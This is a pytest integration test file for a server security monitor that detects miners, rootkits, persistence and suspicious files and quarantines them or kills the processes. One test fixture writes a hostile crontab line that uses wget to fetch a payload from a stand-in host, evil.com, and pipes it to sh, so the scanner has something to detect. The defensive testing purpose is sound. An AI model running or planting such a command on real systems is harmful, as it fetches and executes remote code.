#!/usr/bin/env python3
"""
VPS Guardian - Integration Tests for guardian.py
Tests main loop integration with all security modules.
"""

import pytest
import time
from unittest.mock import Mock, patch, MagicMock, call
from guardian.modules import (
    Detector, ResourceMonitor, NetworkMonitor,
    IntegrityChecker, FilesystemMonitor,
    ResponseHandler, ResponseLevel,
    PersistenceScanner, AuditdMonitor,
    ContainerMonitor
)


class TestGuardianIntegration:
    """Test guardian.py main loop with all new modules."""

    @pytest.fixture
    def mock_all_modules(self):
        """Mock all detection modules."""
        with patch('guardian.modules.Detector') as mock_detector, \
             patch('guardian.modules.ResourceMonitor') as mock_resources, \
             patch('guardian.modules.NetworkMonitor') as mock_network, \
             patch('guardian.modules.IntegrityChecker') as mock_integrity, \
             patch('guardian.modules.FilesystemMonitor') as mock_filesystem, \
             patch('guardian.modules.ResponseHandler') as mock_response, \
             patch('guardian.modules.PersistenceScanner') as mock_persistence, \
             patch('guardian.modules.AuditdMonitor') as mock_auditd:

            # Configure mocks to return empty results by default
            mock_detector.return_value.scan.return_value = []
            mock_resources.return_value.check.return_value = []
            mock_network.return_value.scan.return_value = []
            mock_integrity.return_value.check.return_value = []
            mock_integrity.return_value.check_rootkits.return_value = []
            mock_filesystem.return_value.scan.return_value = []
            mock_persistence.return_value.scan.return_value = []
            mock_auditd.return_value.parse_log.return_value = []
            mock_auditd.return_value.get_suspicious_events.return_value = []

            yield {
                'detector': mock_detector,
                'resources': mock_resources,
                'network': mock_network,
                'integrity': mock_integrity,
                'filesystem': mock_filesystem,
                'response': mock_response,
                'persistence': mock_persistence,
                'auditd': mock_auditd
            }

    def test_modules_initialized_on_startup(self, mock_config):
        """Should initialize all modules on guardian startup."""
        from guardian.guardian import load_config

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector') as mock_detector, \
             patch('guardian.modules.ResourceMonitor') as mock_resources, \
             patch('guardian.modules.NetworkMonitor'), \
             patch('guardian.modules.IntegrityChecker'), \
             patch('guardian.modules.FilesystemMonitor'), \
             patch('guardian.modules.ResponseHandler'), \
             patch('guardian.modules.PersistenceScanner') as mock_persistence, \
             patch('guardian.modules.AuditdMonitor') as mock_auditd, \
             patch('guardian.guardian.time.sleep', side_effect=KeyboardInterrupt):

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # Verify all modules were instantiated
            mock_detector.assert_called_once_with(mock_config)
            mock_resources.assert_called_once_with(mock_config)
            mock_persistence.assert_called_once_with(mock_config)
            mock_auditd.assert_called_once_with(mock_config)

    def test_detector_runs_every_scan_interval(self, mock_config):
        """Should run detector on every scan cycle."""
        from guardian.guardian import load_config

        iterations = 0
        def mock_sleep(seconds):
            nonlocal iterations
            iterations += 1
            if iterations >= 3:
                raise KeyboardInterrupt()

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector') as mock_detector_class, \
             patch('guardian.modules.ResourceMonitor'), \
             patch('guardian.modules.NetworkMonitor'), \
             patch('guardian.modules.IntegrityChecker'), \
             patch('guardian.modules.FilesystemMonitor'), \
             patch('guardian.modules.ResponseHandler'), \
             patch('guardian.modules.PersistenceScanner'), \
             patch('guardian.modules.AuditdMonitor'), \
             patch('guardian.guardian.time.sleep', side_effect=mock_sleep):

            mock_detector = Mock()
            mock_detector.scan.return_value = []
            mock_detector_class.return_value = mock_detector

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # Should have called scan 3 times
            assert mock_detector.scan.call_count == 3

    def test_integrity_check_runs_every_cycle(self, mock_config):
        """Should run integrity check including rootkit detection."""
        iterations = 0
        def mock_sleep(seconds):
            nonlocal iterations
            iterations += 1
            if iterations >= 2:
                raise KeyboardInterrupt()

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector'), \
             patch('guardian.modules.ResourceMonitor'), \
             patch('guardian.modules.NetworkMonitor'), \
             patch('guardian.modules.IntegrityChecker') as mock_integrity_class, \
             patch('guardian.modules.FilesystemMonitor'), \
             patch('guardian.modules.ResponseHandler'), \
             patch('guardian.modules.PersistenceScanner'), \
             patch('guardian.modules.AuditdMonitor'), \
             patch('guardian.guardian.time.sleep', side_effect=mock_sleep):

            mock_integrity = Mock()
            mock_integrity.check.return_value = []
            mock_integrity.check_rootkits.return_value = []
            mock_integrity_class.return_value = mock_integrity

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # Should call both check() and check_rootkits()
            assert mock_integrity.check.call_count == 2
            assert mock_integrity.check_rootkits.call_count == 2

    def test_rootkit_detection_triggers_notification(self, mock_config):
        """Should handle rootkit indicators with notifications."""
        from guardian.modules.integrity import RootkitIndicator

        rootkit_indicator = RootkitIndicator(
            check_name='ld_preload',
            severity='critical',
            description='LD_PRELOAD rootkit detected',
            evidence={'libraries': ['/tmp/malicious.so']}
        )

        iterations = 0
        def mock_sleep(seconds):
            nonlocal iterations
            iterations += 1
            if iterations >= 1:
                raise KeyboardInterrupt()

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector'), \
             patch('guardian.modules.ResourceMonitor'), \
             patch('guardian.modules.NetworkMonitor'), \
             patch('guardian.modules.IntegrityChecker') as mock_integrity_class, \
             patch('guardian.modules.FilesystemMonitor'), \
             patch('guardian.modules.ResponseHandler') as mock_response_class, \
             patch('guardian.modules.PersistenceScanner'), \
             patch('guardian.modules.AuditdMonitor'), \
             patch('guardian.guardian.time.sleep', side_effect=mock_sleep):

            mock_integrity = Mock()
            mock_integrity.check.return_value = []
            mock_integrity.check_rootkits.return_value = [rootkit_indicator]
            mock_integrity_class.return_value = mock_integrity

            mock_response = Mock()
            mock_response_class.return_value = mock_response

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # Verify handle_threat was called for rootkit
            assert mock_response.handle_threat.call_count >= 1
            call_args = mock_response.handle_threat.call_args
            assert call_args[1]['name'] == 'rootkit:ld_preload'
            assert call_args[1]['level'] == ResponseLevel.NOTIFY

    def test_network_threats_trigger_hard_kill(self, mock_config):
        """Should kill processes with mining pool connections."""
        from guardian.modules.network import NetworkThreat

        network_threat = NetworkThreat(
            pid=9999,
            name='suspicious_miner',
            reason='Mining pool connection detected',
            remote_ip='1.2.3.4',
            remote_port=3333
        )

        iterations = 0
        def mock_sleep(seconds):
            nonlocal iterations
            iterations += 1
            if iterations >= 1:
                raise KeyboardInterrupt()

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector'), \
             patch('guardian.modules.ResourceMonitor'), \
             patch('guardian.modules.NetworkMonitor') as mock_network_class, \
             patch('guardian.modules.IntegrityChecker'), \
             patch('guardian.modules.FilesystemMonitor'), \
             patch('guardian.modules.ResponseHandler') as mock_response_class, \
             patch('guardian.modules.PersistenceScanner'), \
             patch('guardian.modules.AuditdMonitor'), \
             patch('guardian.guardian.clean_zombies'), \
             patch('guardian.guardian.time.sleep', side_effect=mock_sleep):

            mock_network = Mock()
            mock_network.scan.return_value = [network_threat]
            mock_network_class.return_value = mock_network

            mock_response = Mock()
            mock_response_class.return_value = mock_response

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # Verify KILL level was used
            assert mock_response.handle_threat.call_count >= 1
            call_args = mock_response.handle_threat.call_args
            assert call_args[1]['pid'] == 9999
            assert call_args[1]['level'] == ResponseLevel.KILL

    def test_module_exceptions_handled_gracefully(self, mock_config):
        """Should continue running if one module raises an exception."""
        iterations = 0
        def mock_sleep(seconds):
            nonlocal iterations
            iterations += 1
            if iterations >= 2:
                raise KeyboardInterrupt()

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector') as mock_detector_class, \
             patch('guardian.modules.ResourceMonitor') as mock_resources_class, \
             patch('guardian.modules.NetworkMonitor'), \
             patch('guardian.modules.IntegrityChecker'), \
             patch('guardian.modules.FilesystemMonitor'), \
             patch('guardian.modules.ResponseHandler'), \
             patch('guardian.modules.PersistenceScanner'), \
             patch('guardian.modules.AuditdMonitor'), \
             patch('guardian.guardian.time.sleep', side_effect=mock_sleep):

            # Detector raises exception
            mock_detector = Mock()
            mock_detector.scan.side_effect = RuntimeError("Detector failed")
            mock_detector_class.return_value = mock_detector

            # Resources should still work
            mock_resources = Mock()
            mock_resources.check.return_value = []
            mock_resources_class.return_value = mock_resources

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # Resources should still be called despite detector failure
            assert mock_resources.check.call_count == 2

    def test_zombie_cleanup_runs_every_cycle(self, mock_config):
        """Should clean zombie processes on every iteration."""
        iterations = 0
        def mock_sleep(seconds):
            nonlocal iterations
            iterations += 1
            if iterations >= 2:
                raise KeyboardInterrupt()

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector'), \
             patch('guardian.modules.ResourceMonitor'), \
             patch('guardian.modules.NetworkMonitor'), \
             patch('guardian.modules.IntegrityChecker'), \
             patch('guardian.modules.FilesystemMonitor'), \
             patch('guardian.modules.ResponseHandler'), \
             patch('guardian.modules.PersistenceScanner'), \
             patch('guardian.modules.AuditdMonitor'), \
             patch('guardian.guardian.clean_zombies') as mock_clean_zombies, \
             patch('guardian.guardian.time.sleep', side_effect=mock_sleep):

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # Should call clean_zombies on every cycle
            assert mock_clean_zombies.call_count == 2

    def test_filesystem_monitor_quarantines_orphan_files(self, mock_config):
        """Should quarantine suspicious files without running processes."""
        from guardian.modules.filesystem import SuspiciousFile

        sus_file = SuspiciousFile(
            path='/tmp/malware.elf',
            reason='Executable in temp directory',
            age_minutes=15,
            is_executable=True,
            size_bytes=1024000
        )

        iterations = 0
        def mock_sleep(seconds):
            nonlocal iterations
            iterations += 1
            if iterations >= 1:
                raise KeyboardInterrupt()

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector'), \
             patch('guardian.modules.ResourceMonitor'), \
             patch('guardian.modules.NetworkMonitor'), \
             patch('guardian.modules.IntegrityChecker'), \
             patch('guardian.modules.FilesystemMonitor') as mock_filesystem_class, \
             patch('guardian.modules.ResponseHandler') as mock_response_class, \
             patch('guardian.modules.PersistenceScanner'), \
             patch('guardian.modules.AuditdMonitor'), \
             patch('psutil.process_iter', return_value=[]), \
             patch('os.path.exists', return_value=True), \
             patch('guardian.guardian.time.sleep', side_effect=mock_sleep):

            mock_filesystem = Mock()
            mock_filesystem.scan.return_value = [sus_file]
            mock_filesystem_class.return_value = mock_filesystem

            mock_response = Mock()
            mock_response_class.return_value = mock_response

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # Should quarantine orphan file
            mock_response._quarantine_file.assert_called_once_with('/tmp/malware.elf')

    def test_scan_interval_respected(self, mock_config):
        """Should sleep for configured scan_interval between cycles."""
        mock_config['detection']['scan_interval_seconds'] = 5

        iterations = 0
        sleep_calls = []

        def mock_sleep(seconds):
            nonlocal iterations
            sleep_calls.append(seconds)
            iterations += 1
            if iterations >= 3:
                raise KeyboardInterrupt()

        with patch('guardian.guardian.load_config', return_value=mock_config), \
             patch('guardian.modules.Detector'), \
             patch('guardian.modules.ResourceMonitor'), \
             patch('guardian.modules.NetworkMonitor'), \
             patch('guardian.modules.IntegrityChecker'), \
             patch('guardian.modules.FilesystemMonitor'), \
             patch('guardian.modules.ResponseHandler'), \
             patch('guardian.modules.PersistenceScanner'), \
             patch('guardian.modules.AuditdMonitor'), \
             patch('guardian.guardian.time.sleep', side_effect=mock_sleep):

            try:
                from guardian.guardian import main
                main()
            except KeyboardInterrupt:
                pass

            # All sleep calls should be 5 seconds
            assert all(s == 5 for s in sleep_calls)


class TestModuleIntegration:
    """Test integration between specific modules."""

    def test_forensics_collected_before_kill(self, mock_config, tmp_path):
        """Should collect forensics data before killing process."""
        from guardian.modules.response import ResponseHandler, ResponseLevel

        mock_config['forensics']['storage_dir'] = str(tmp_path / 'forensics')
        mock_config['response']['quarantine_dir'] = str(tmp_path / 'quarantine')
        mock_config['response']['log_file'] = str(tmp_path / 'incidents.jsonl')

        response = ResponseHandler(mock_config)

        with patch('guardian.modules.response.psutil.Process') as mock_proc_class, \
             patch('guardian.modules.response.os.kill') as mock_kill:

            mock_proc = Mock()
            mock_proc.pid = 9999
            mock_proc.ppid.return_value = 1
            mock_proc.uids.return_value = Mock(real=0)
            mock_proc.username.return_value = 'root'
            mock_proc.exe.return_value = '/tmp/miner'
            mock_proc.cwd.return_value = '/tmp'
            mock_proc.cmdline.return_value = ['/tmp/miner']
            mock_proc.environ.return_value = {}
            mock_proc.open_files.return_value = []
            mock_proc.connections.return_value = []
            mock_proc.parent.return_value = None
            mock_proc.children.return_value = []
            mock_proc_class.return_value = mock_proc

            response.handle_threat(
                pid=9999,
                name='miner',
                reason='Mining detected',
                level=ResponseLevel.KILL,
                exe_path='/tmp/miner'
            )

            # Verify forensics file was created
            forensics_dir = tmp_path / 'forensics'
            assert forensics_dir.exists()
            forensics_files = list(forensics_dir.glob('*.json'))
            assert len(forensics_files) >= 1

    def test_persistence_scanner_detects_crontab(self, mock_config, tmp_path):
        """Should detect malicious crontab entries."""
        from guardian.modules.persistence import PersistenceScanner

        crontab_file = tmp_path / 'etc' / 'crontab'
        crontab_file.parent.mkdir(parents=True, exist_ok=True)
        crontab_file.write_text("*/5 * * * * wget http://evil.com/miner | sh\n")

        mock_config['persistence']['crontab']['system_paths'] = [str(crontab_file)]

        scanner = PersistenceScanner(mock_config)
        threats = scanner.scan()

        assert len(threats) >= 1
        assert 'wget' in threats[0].content_snippet

    def test_auditd_monitor_parses_execve_events(self, mock_config, tmp_path):
        """Should parse EXECVE events from auditd log."""
        from guardian.modules.auditd import AuditdMonitor

        log_content = """type=SYSCALL msg=audit(1706000000.123:456): arch=c000003e syscall=59 success=yes exit=0 ppid=1 pid=12345 uid=0
type=EXECVE msg=audit(1706000000.123:456): argc=1 a0="/tmp/malware"
type=CWD msg=audit(1706000000.123:456): cwd="/tmp"
type=PATH msg=audit(1706000000.123:456): item=0 name="/tmp/malware" key="guardian_tmp"
"""

        log_path = tmp_path / 'audit.log'
        log_path.write_text(log_content)

        mock_config['auditd']['log_path'] = str(log_path)
        mock_config['auditd']['enabled'] = True

        monitor = AuditdMonitor(mock_config)
        events = monitor.parse_log(since_last=False)

        assert len(events) == 1
        assert events[0].exe == '/tmp/malware'
        assert events[0].pid == 12345

    def test_container_monitor_initialization(self, mock_config):
        """Should initialize ContainerMonitor module."""
        from guardian.modules.container_monitor import ContainerMonitor

        monitor = ContainerMonitor(mock_config)

        assert monitor.enabled is True
        assert monitor.cpu_threshold == 100
        assert monitor.kill_after_minutes == 15
        assert monitor.check_interval == 60

    def test_container_monitor_integration_in_main_loop(self, mock_config):
        """Should integrate container monitoring in main guardian loop."""
        from guardian.modules.container_monitor import ContainerMonitor, ContainerAbuse

        monitor = ContainerMonitor(mock_config)

        # Simulate abusive container
        with patch.object(monitor, 'check') as mock_check:
            mock_check.return_value = [
                ContainerAbuse(
                    container_id='abc123def456',
                    container_name='miner',
                    image='ubuntu',
                    cpu_percent=150.0,
                    duration_minutes=16.0,
                    labels={}
                )
            ]

            abusive = monitor.check()
            assert len(abusive) == 1
            assert abusive[0].container_name == 'miner'
            assert abusive[0].cpu_percent == 150.0
